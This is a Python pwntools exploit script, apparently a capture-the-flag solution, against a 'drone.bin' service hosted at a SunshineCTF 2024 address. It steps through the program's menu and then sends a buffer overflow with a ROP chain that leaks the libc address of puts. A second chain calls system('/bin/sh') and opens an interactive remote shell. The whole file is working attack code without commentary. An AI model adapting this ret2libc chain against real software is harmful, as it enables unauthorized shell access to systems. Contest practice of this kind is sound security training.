#!/usr/bin/env python3

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./drone.bin')
func = p64(elf.symbols['deprecated_feedback'])
rop = ROP(elf)
pop_rdi = p64(rop.rdi.address)
pop_rdx = p64(rop.rdx.address)
ret_gadget = p64(rop.ret.address)
read_got = p64(elf.got['read'])
atoi_got = p64(elf.got['printf'])
padding = b'p' * 264

p = remote('2024.sunshinectf.games', 24004)
#p = process('./drone.bin')
#p = gdb.debug('./drone.bin')
puts_got = p64(elf.got['puts'])
puts_plt = p64(elf.plt['puts'])
# setup
p.recvuntil(b'>>> ')
p.sendline(b'SAFE')
p.recvuntil(b'>>> ')
p.sendline(b'N')
p.recvuntil(b'>>> ')
p.sendline(b'CAMO')
p.recvuntil(b'>>> ')
p.sendline(b'N')
p.recvuntil(b'>>> ')
# first pass
payload = b''.join([padding, pop_rdi, puts_got, puts_plt, func])
p.sendline(payload)
leaked = p.recvline()[:6]
puts_addr = u64(b''.join([leaked, b'\x00\x00']))
#print(hex(puts_addr))
# second pass
system_addr = p64(puts_addr - 0x87bd0 + 0x58740) # use libc addrs
binsh_addr = p64(next(elf.search(b'/bin/sh\0')))
payload = b''.join([padding, pop_rdi, binsh_addr, ret_gadget, system_addr])
p.recvuntil(b'>>> ')
p.sendline(payload)
p.interactive()
